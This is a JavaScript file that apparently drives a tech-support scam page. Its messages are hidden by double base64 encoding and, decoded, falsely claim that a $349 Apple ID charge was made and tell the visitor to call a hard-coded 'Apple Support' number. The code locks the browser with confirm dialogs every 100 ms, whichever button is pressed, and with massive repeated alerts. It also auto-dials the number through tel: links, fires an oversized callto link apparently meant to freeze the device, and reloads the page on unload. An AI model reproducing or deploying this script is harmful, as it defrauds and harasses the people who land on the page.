function getURLParameter(name) {
    return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
    );
};
var cookieHelper = {
    defParams: {
        path: "/",
        domain: "." + window.location.host.replace(/:\d+/, "")
    },
    set: function(a, d, c) {
        c = c || {};
        for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
        b = c.expires;
        if ("number" == typeof b && b) {
            var e = new Date;
            e.setTime(e.getTime() + 1E3 * b);
            b = c.expires = e
        }
        b && b.toUTCString && (c.expires = b.toUTCString());
        d = encodeURIComponent(d);
        a = a + "=" + d;
        for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
        document.cookie = a
    },
    get: function(a) {
        return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
    },
    del: function(a) {
        this.set(a, null, {
            expires: -1
        })
    }
};
var userAgent = window.navigator.userAgent.toLowerCase(), ios = /iphone|ipod|ipad/.test(userAgent);

function parseURL(url) {
    var a = document.createElement('a');
    a.href = url;
    return a.hostname.replace('www.', '');
};
function getPar(name) {
    var url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
};

var text_number = '+1-866-381-4136';
document.querySelector('meta[property="telephone"]').setAttribute("content", text_number);
document.querySelector('.telephone').innerText = text_number;
window.number = getPar('phone');
window.number = (window.number ? window.number : text_number);
window.device = 'iPhone';
window.refef = parseURL(document.referrer);

if(ios) {
    if(/iphone/.test(userAgent)) {
        window.device = 'iPhone';
    }
    if(/ipad/.test(userAgent)) {
        window.device = 'iPad';
    }
    if(/ipod/.test(userAgent)) {
        window.device = 'iPod';
    }
}

var text_charges = atob(atob("SkRNME9RPT0="));
var text = cookieHelper.get('textSetBl');
var phone = cookieHelper.get('phoneSetBl');
function getText() {
    return atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc="))+text_charges+atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc="))+text_number+atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU="));
}

if(!phone) {
    phone = getURLParameter('phone');
}
if(!text) {
    text = getURLParameter('text');
}
var sText = document.querySelectorAll('.js_setTextBlock');
for (var t = 0; t < sText.length; t++) {
    sText[t].innerHTML = getText();
}
var sPhone = document.querySelectorAll('.js_setPhoneBlock');
for (var p = 0; p < sPhone.length; p++) {
    sPhone[p].innerHTML = phone;
}

function okkkk() {
    jQuery('#result').append('<a class="anchorcall" href="tel:'+text_number+'"></a>');
    document.querySelector('a').click();
    var extraData = "";
    for(itxextraData = 0; itxextraData < 200; itxextraData++) {
        var extraData = extraData + "5555555555";
    }
    jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
    document.querySelector('a').click();
    document.querySelector('a').click();
    document.querySelector('a').click();
    document.querySelector('a').click();
    document.querySelector('a').click();
    document.querySelector('a').click();
    setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
}
function myFunction() {
    if(confirm(atob(atob("V1c5MWNpQkJjSEJzWlNCSlJDQjNZWE1nY21WalpXNTBiSGtnZFhObFpDQmhkQ0JCVUZCTVJTQlRWRTlTUlNCbWIzSWc="))+text_charges+atob(atob("SUZacFlTQkJjSEJzWlNCUVlYa2dVSEpsTFVGMWRHaHZjbWw2WVhScGIyNGhJRmRsSUdoaGRtVWdjR3hoWTJWa0lIUm9iM05sSUhKbGNYVmxjM1FnYjI0Z2FHOXNaQ0IwYnlCbGJuTjFjbVVnYzJGbVpYTjBJR0Z1WkNCVFpXTjFjbWwwZVM1T2IzUWdlVzkxUHlCSmJXMWxaR2xoZEdWc2VTQmpZV3hzSUVGd2NHeGxJRk4xY0hCdmNuUWc="))+text_number+atob(atob("SUhSdklFWnlaV1Y2WlNCcGRDRXU=")))) {
        okkkk();
    }
    else {
        okkkk();
    }
}
window.ununload = function() {
    debugger; location.reload();
}
setInterval(function() { myFunction() }, 100);